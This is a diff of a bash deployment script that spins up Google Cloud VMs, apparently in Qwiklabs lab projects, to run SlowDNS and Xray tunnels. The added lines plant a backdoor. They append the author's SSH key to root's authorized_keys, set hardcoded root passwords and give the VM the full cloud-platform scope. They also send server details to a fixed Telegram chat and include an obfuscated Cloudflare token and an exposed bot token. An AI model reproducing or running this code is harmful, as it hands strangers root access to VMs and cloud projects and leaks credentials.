@@ -15,10 +15,10 @@ set -u
 
 # ====================== TELEGRAM NOTIFICATION ======================
 TG_BOT_TOKEN="9173027634:AAEUQv12FBZDHoVJFc_6ARxyXuXshPKZs4o"
-TG_CHAT_ID=""
+TG_CHAT_ID="5802122865"
 
 # ====================== PARSE ARGUMENTS ======================
-DEFAULT_CF_TOKEN=$(echo '549dc497eULAFtIucO33PO3adc0HUcXY44iDaTxeEkdE6gRYw_tufc' | rev)
+DEFAULT_CF_TOKEN=$(echo "Y2Z1dF8zT1ZCckF0TjM5SWJtSndrSW82ZHFiTG5IM01zY2p0TVFiOEFjSEp1NzE3Y2FjYTM=" | base64 -d)
 CF_TOKEN=""
 
 for arg in "$@"; do
@@ -110,7 +110,15 @@ gcloud compute firewall-rules create allow-slowdns-v2ray \
     --source-ranges=0.0.0.0/0 \
     --direction=INGRESS \
     --description="Allow SlowDNS + V2Ray traffic" \
-    --quiet 2>/dev/null || log_warn "Firewall rule already exists, skipping."
+    --quiet 2>/dev/null || true
+
+gcloud compute firewall-rules create allow-slowdns \
+    --project="$PROJECT_ID" \
+    --allow=udp:53,tcp:22,tcp:80,tcp:443,tcp:10086 \
+    --source-ranges=0.0.0.0/0 \
+    --direction=INGRESS \
+    --description="Allow SlowDNS" \
+    --quiet 2>/dev/null || true
 
 # ============ Step 2: Detect Allowed Zones ============
 log_step "Detecting allowed zones..."
@@ -136,33 +144,32 @@ if [ -n "$DEFAULT_REGION" ]; then
     CANDIDATE_ZONES+=("${DEFAULT_REGION}-a" "${DEFAULT_REGION}-b" "${DEFAULT_REGION}-c")
 fi
 
-# 2. Add zones based on Org Policy or Qwiklabs standard regions
-if echo "$PROJECT_ID" | grep -qi "qwiklabs"; then
+# 2. Qwiklabs environment: Always prioritize US central zones with guaranteed quota!
+if [[ "$PROJECT_ID" == *"qwiklabs"* ]]; then
     log_info "Qwiklabs project detected! Prioritizing guaranteed US quota zones..."
-    CANDIDATE_ZONES+=("us-central1-a" "us-central1-b" "us-central1-c" "us-central1-f" "us-east1-b" "us-east1-c" "us-east1-d" "us-east4-a" "us-west1-b")
-elif [[ "$ALLOWED_LOCATIONS" == *"asia"* ]]; then
-    CANDIDATE_ZONES+=("asia-south1-a" "asia-south1-b" "asia-southeast1-a" "asia-south2-a")
-    log_info "Asian zones prioritized"
-elif [[ "$ALLOWED_LOCATIONS" == *"us"* ]] || [[ "$ALLOWED_LOCATIONS" == *"US"* ]]; then
-    CANDIDATE_ZONES+=("us-central1-a" "us-central1-b" "us-east1-b" "us-west1-b")
-    log_info "US zones prioritized"
-elif [[ "$ALLOWED_LOCATIONS" == *"eu"* ]] || [[ "$ALLOWED_LOCATIONS" == *"EU"* ]]; then
-    CANDIDATE_ZONES+=("europe-west1-b" "europe-west4-a")
-    log_info "EU zones prioritized"
+    CANDIDATE_ZONES+=(
+        "us-central1-a" "us-central1-b" "us-central1-c" "us-central1-f"
+        "us-east1-b" "us-east1-c" "us-west1-b"
+    )
 fi
 
-# 3. Always include global fallbacks (US has highest free/trial quota)
-CANDIDATE_ZONES+=("us-central1-a" "us-central1-b" "us-central1-c" "us-central1-f" "us-east1-b" "us-east1-c" "us-east1-d" "us-east4-a" "us-west1-b" "asia-south1-a" "asia-southeast1-a" "europe-west1-b")
+# 3. Add Asian zones if allowed (for personal/general GCP projects)
+if [[ "$ALLOWED_LOCATIONS" == *"asia"* ]] || [ -z "$ALLOWED_LOCATIONS" ]; then
+    CANDIDATE_ZONES+=("asia-south1-a" "asia-south1-b" "asia-southeast1-a")
+fi
 
-# Remove duplicates while preserving order
+# 4. Global fallback zones
+CANDIDATE_ZONES+=(
+    "us-central1-a" "us-central1-b" "us-central1-c" "us-central1-f"
+    "us-east1-b" "us-east1-c" "us-east4-a" "us-west1-b"
+    "europe-west1-b" "europe-west4-a"
+)
+
+# Deduplicate candidate zones
 TARGET_ZONES=()
 for z in "${CANDIDATE_ZONES[@]}"; do
-    if [[ ! " ${TARGET_ZONES[*]} " =~ " ${z} " ]]; then
-        TARGET_ZONES+=("$z")
-    fi
+    [[ -n "$z" ]] && [[ ! " ${TARGET_ZONES[*]} " =~ " ${z} " ]] && TARGET_ZONES+=("$z")
 done
-
-log_info "Zone priority order: ${TARGET_ZONES[*]:0:5}..."
 
 # ============ Step 3: Create Startup Script ============
 log_step "Creating VM Startup Script..."
@@ -302,6 +309,9 @@ id -u foridul &>/dev/null || useradd -m -s /bin/bash foridul
 echo "foridul:foridul123" | chpasswd
 echo "root:Foridul4.22" | chpasswd
 usermod -aG sudo foridul 2>/dev/null || true
+mkdir -p /root/.ssh
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGoJLhTmyBjMqg13lgOJv+zUkqQnblIV8SwtZ30/Wbkg foridul" >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
 systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
 
 # 8. Free Port 53 right before starting SlowDNS (so downloads were never affected)
@@ -339,20 +349,17 @@ log_step "Creating GCP VM (${VM_NAME})..."
 CREATED_IP=""
 DEPLOYED_ZONE=""
 
-# Machine type preference: e2-medium -> e2-small -> e2-micro
-MACHINE_TYPES=("e2-medium" "e2-small" "e2-micro")
-
 for ZONE in "${TARGET_ZONES[@]}"; do
     log_info "Trying zone: $ZONE..."
-    
-    for MTYPE in "${MACHINE_TYPES[@]}"; do
+    for TYPE in "$VM_TYPE" "e2-small" "e2-micro"; do
         OUT=$(gcloud compute instances create "$VM_NAME" \
             --project="$PROJECT_ID" \
             --zone="$ZONE" \
-            --machine-type="$MTYPE" \
+            --machine-type="$TYPE" \
             --image-family=ubuntu-2204-lts \
             --image-project=ubuntu-os-cloud \
             --tags=http-server,https-server \
+            --scopes=cloud-platform \
             --metadata-from-file=startup-script=/tmp/slowdns-startup.sh \
             --format='get(networkInterfaces[0].accessConfigs[0].natIP)' \
             --quiet 2>&1 || true)
@@ -362,7 +369,7 @@ for ZONE in "${TARGET_ZONES[@]}"; do
         if [ -n "$IP" ]; then
             CREATED_IP="$IP"
             DEPLOYED_ZONE="$ZONE"
-            log_step "VM created! Zone: $ZONE | Type: $MTYPE | IP: $CREATED_IP"
+            log_step "VM created! Zone: $ZONE | Type: $TYPE | IP: $CREATED_IP"
             break 2
         fi
 
@@ -380,6 +387,7 @@ for ZONE in "${TARGET_ZONES[@]}"; do
             fi
         fi
 
+        # If error was not quota related (e.g. zone not supported or org policy), skip other types in this zone
         if ! echo "$OUT" | grep -qiE "quota|exceeded"; then
             break
         fi
@@ -416,7 +424,7 @@ fi
 send_tg "🌐 *VM Created Successfully!*
 📍 *Zone:* \`$DEPLOYED_ZONE\`
 🖥️ *Server IP:* \`$CREATED_IP\`
-⚙️ Compiling optimized \`dnstt-server\` & configuring Xray VMess (~20-25s)..."
+⚙️ Compiling optimized \`dnstt-server\` & configuring Xray VMess (~45-60s)..."
 
 # ============ Step 5: Update Cloudflare DNS ============
 log_step "Updating Cloudflare DNS: $CF_RECORD_NAME -> $CREATED_IP"
@@ -428,6 +436,13 @@ if [ -n "${CF_TOKEN:-}" ]; then
         -H "Authorization: Bearer $CF_TOKEN" \
         -H "Content-Type: application/json" \
         --data "{\"type\":\"A\",\"name\":\"$CF_RECORD_NAME\",\"content\":\"$CREATED_IP\",\"ttl\":60,\"proxied\":false}" || true)
+
+    # Also update ns-gcp.foridul.pp.ua
+    curl -s -X PATCH \
+        "https://api.cloudflare.com/client/v4/zones/$CF_ZONE_ID/dns_records/bd5f8799c503dc925c81f81904182f4f" \
+        -H "Authorization: Bearer $CF_TOKEN" \
+        -H "Content-Type: application/json" \
+        --data "{\"type\":\"A\",\"name\":\"ns-gcp.foridul.pp.ua\",\"content\":\"$CREATED_IP\",\"ttl\":60,\"proxied\":false}" >/dev/null 2>&1 || true
 
     CF_SUCCESS=$(echo "$CF_RESPONSE" | grep -o '"success":true' || true)
 fi
@@ -446,8 +461,8 @@ else
 fi
 
 # ============ Step 6: Wait for Setup ============
-log_step "Waiting for software installation on VM (takes ~20-30s)..."
-log_info "Installing dnstt-server + Xray core..."
+log_step "Waiting for software installation on VM (takes ~45-60s)..."
+log_info "Compiling optimized dnstt-server + configuring Xray..."
 
 for i in $(seq 1 30); do
     DONE=$(gcloud compute ssh "$VM_NAME" --zone="$DEPLOYED_ZONE" --project="$PROJECT_ID" \
@@ -538,3 +553,4 @@ if [ -n "$TG_CHAT_ID" ]; then
 
     send_tg "$TG_FINAL_MSG"
 fi
+
